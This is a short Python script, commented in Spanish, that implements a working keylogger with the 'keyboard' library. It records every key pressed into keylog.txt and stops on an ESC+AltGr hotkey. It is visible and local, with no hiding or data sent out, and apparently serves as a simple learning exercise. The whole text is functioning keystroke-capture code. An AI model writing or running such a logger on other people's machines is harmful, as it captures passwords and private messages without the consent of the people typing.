# Importo la libreria necesario para el keylogger
import keyboard
# Estas lineas hacen que el archivo de texto se limpie cada vez que se ejecute el programa ya que el argumento w es sobreescritura siempre que el archivo ya exista, si no, creará el archivo
with open("keylog.txt", "w") as log_file:
    log_file.write("")
# Creo una funcion que se encargara de guardar las teclas pulsadas en el archivo de texto usando el argumento a que es para añadir al final del archivo en vez de sobreescribirlo
def iniciar_keylogger(tecla):
    with open("keylog.txt", "a") as log_file:
        log_file.write(f"{tecla.name} ")
# Con esta línea leo las teclas pulsadas
keyboard.on_press(iniciar_keylogger)
# Creo una función para parar el keylogger
def parar_keylogger():
    print("Keylogger parado.")
    keyboard.unhook_all()
    exit()
# Llamo a la funcion con una combinacion de teclas y para el keylogger
keyboard.add_hotkey('esc+alt gr', parar_keylogger)
print("Keylogger funcionando. Pulsa ESC+AltGr para pararlo.")
# Con esta ultima línea mantengo el programa en ejecución
keyboard.wait()